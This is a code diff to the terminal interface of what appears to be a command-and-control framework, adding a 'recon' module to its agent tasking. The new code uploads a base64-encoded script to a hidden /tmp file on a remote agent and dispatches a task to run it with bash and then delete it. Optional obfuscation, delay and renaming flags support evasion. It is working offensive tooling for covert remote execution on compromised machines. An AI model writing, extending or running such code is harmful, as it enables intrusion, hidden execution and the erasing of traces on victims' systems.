@@ -17,7 +17,7 @@ Keys:
     q       quit
 """
 
-import asyncio, base64, gzip, json, os, pathlib, re, shlex, shutil, subprocess, sys, tempfile, time, uuid
+import asyncio, base64, gzip, json, os, pathlib, re, shutil, subprocess, sys, tempfile, time, uuid
 from rich.markup import escape as _escape
 from rich.text import Text
 from dotenv import load_dotenv
@@ -393,6 +393,7 @@ class CipherfallTUI(App):
     _agents_data: dict[str, dict] = {}  # agent_id -> agent dict (includes sysinfo)
     _download_tasks:    dict[str, dict] = {}  # task_id -> {type, ...}
     _download_sessions: dict[str, dict] = {}  # session_id -> state
+    _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -583,6 +584,40 @@ class CipherfallTUI(App):
         log = self.query_one("#output-log", RichLog)
         log.clear()
         log.write(f"[bold cyan]$ {task['command']}[/bold cyan]")
+
+        rc = self._recon_tasks.get(task_id)
+        if rc and rc["type"] == "recon_write":
+            out = task.get("output") or ""
+            if "written" in out:
+                rp       = rc["remote_path"]
+                aid      = rc["agent_id"]
+                base_url = self._agent_base.get(aid, BASE)
+                exec_cmd = f"bash {rp}; rm -f {rp}"
+                log.write(f"[yellow]upload done — launching recon…[/yellow]")
+                try:
+                    async with httpx.AsyncClient() as c:
+                        r2 = await c.post(f"{base_url}/admin/task",
+                                          json={"agent_id": aid, "command": exec_cmd},
+                                          timeout=3)
+                        res = r2.json()
+                    self._recon_tasks[res["task_id"]] = {"type": "recon_exec", "agent_id": aid, "remote_path": rp}
+                    self._selected_task = res["task_id"]
+                    await self._load_tasks(aid)
+                except Exception as e:
+                    log.write(f"[red]exec dispatch error: {e}[/red]")
+            elif out:
+                log.write(f"[red]upload error: {_escape(out[:200])}[/red]")
+            else:
+                log.write("[dim]uploading script…[/dim]")
+            return
+        if rc and rc["type"] == "recon_exec":
+            out = task.get("output") or ""
+            if out:
+                log.write(f"[green]{_escape(out.strip())}[/green]")
+            else:
+                log.write("[dim]running recon…[/dim]")
+            return
+
         dl = self._download_tasks.get(task_id)
         if dl is None:
             if task.get("output"):
@@ -749,6 +784,8 @@ class CipherfallTUI(App):
         _download_local  = ""
         _download_remote = ""
         _is_ntp          = False
+        _recon_remote    = ""
+        _recon_aid       = ""
         if cmd.startswith("/module upload"):
             parts = cmd.split(None, 3)
             if len(parts) < 3:
@@ -842,9 +879,11 @@ class CipherfallTUI(App):
                 data  = tmp.read_bytes()
                 b64   = base64.b64encode(data).decode()
                 rname = f"/tmp/.{uuid.uuid4().hex[:8]}"
-                cmd   = f"echo {shlex.quote(b64)} | base64 -d > {rname} && bash {rname}; rm -f {rname}"
+                cmd   = f"WRITE:{rname}:{b64}"
                 flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
-                log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes[/green]")
+                log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
+                _recon_remote = rname
+                _recon_aid    = self._selected_agent
             finally:
                 shutil.rmtree(tmpdir, ignore_errors=True)
         elif cmd.startswith("/module relay"):
@@ -879,6 +918,12 @@ class CipherfallTUI(App):
             return
 
         self._selected_task = result["task_id"]
+        if _recon_remote:
+            self._recon_tasks[result["task_id"]] = {
+                "type":        "recon_write",
+                "agent_id":    _recon_aid,
+                "remote_path": _recon_remote,
+            }
         if _download_local:
             tid = result["task_id"]
             if _is_ntp:
